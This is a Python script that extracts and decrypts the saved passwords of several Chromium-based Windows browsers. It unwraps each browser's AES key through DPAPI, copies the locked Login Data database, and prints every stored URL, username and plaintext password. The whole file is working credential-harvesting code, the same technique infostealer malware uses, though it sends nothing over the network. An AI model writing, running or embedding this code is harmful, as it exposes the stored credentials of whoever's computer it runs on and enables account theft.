import os
import json
import base64
import sqlite3
import shutil
from Crypto.Cipher import AES
import win32crypt  # For Windows DPAPI decryption

# Paths to browser-specific Login Data and Local State files
BROWSER_PATHS = {
    "Brave": {
        "db_path": os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
        "state_path": os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State")
    },
    "Chrome": {
        "db_path": os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data"),
        "state_path": os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
    },
    "Opera": {
        "db_path": os.path.expanduser(r"~\AppData\Roaming\Opera Software\Opera Stable\Login Data"),
        "state_path": os.path.expanduser(r"~\AppData\Roaming\Opera Software\Opera Stable\Local State")
    },
    "Edge": {
        "db_path": os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"),
        "state_path": os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Local State")
    },
    "Chromium": {
        "db_path": os.path.expanduser(r"~\AppData\Local\Chromium\User Data\Default\Login Data"),
        "state_path": os.path.expanduser(r"~\AppData\Local\Chromium\User Data\Local State")
    },
    "Arc": {
        "db_path": os.path.expanduser(r"~\AppData\Local\Arc\User Data\Default\Login Data"),
        "state_path": os.path.expanduser(r"~\AppData\Local\Arc\User Data\Local State")
    }
}

def get_encryption_key(state_path):
    """Retrieve the AES key from Local State file for Chrome-based browsers."""
    with open(state_path, "r", encoding="utf-8") as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_password(encrypted_password, key):
    """Decrypts an AES-encrypted password using the provided key."""
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        return f"Decryption failed: {e}"

def copy_db_file(db_path):
    """Copies the database file to bypass the locked database error."""
    temp_db_path = db_path + ".temp"
    shutil.copy2(db_path, temp_db_path)  # Copy the file
    return temp_db_path

def fetch_passwords(browser_name):
    """Extracts and decrypts saved passwords for the specified browser."""
    browser_paths = BROWSER_PATHS.get(browser_name)
    if not browser_paths:
        print(f"{browser_name} is not supported.")
        return

    db_path = browser_paths["db_path"]
    state_path = browser_paths["state_path"]

    if not os.path.exists(db_path) or not os.path.exists(state_path):
        print(f"Files for {browser_name} not found.")
        return

    # Copy the database file temporarily to avoid "database is locked" errors
    temp_db_path = copy_db_file(db_path)

    encryption_key = get_encryption_key(state_path)
    
    # Connect to the temporary copied database
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, encryption_key)
        print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")

    cursor.close()
    conn.close()

    # Remove the temporary database copy after use
    os.remove(temp_db_path)

if __name__ == "__main__":
    browser_name = input("Enter the browser name (Brave, Chrome, Opera, Edge, Chromium, Arc): ")
    fetch_passwords(browser_name)
